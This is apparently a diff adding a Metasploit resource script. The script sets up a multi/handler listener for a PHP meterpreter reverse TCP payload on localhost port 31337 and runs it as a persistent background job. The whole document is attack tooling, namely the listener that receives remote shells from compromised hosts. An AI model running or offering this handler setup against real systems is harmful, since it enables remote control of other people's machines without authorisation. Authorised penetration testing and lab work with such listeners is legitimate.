@@ -1,0 +1,9 @@
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set EnableContextEncoding false
+set DisablePayloadHandler false
+set ExitOnSession false
+set ListenerTimeout 0
+set LHOST 127.0.0.1
+set LPORT 31337
+run -j
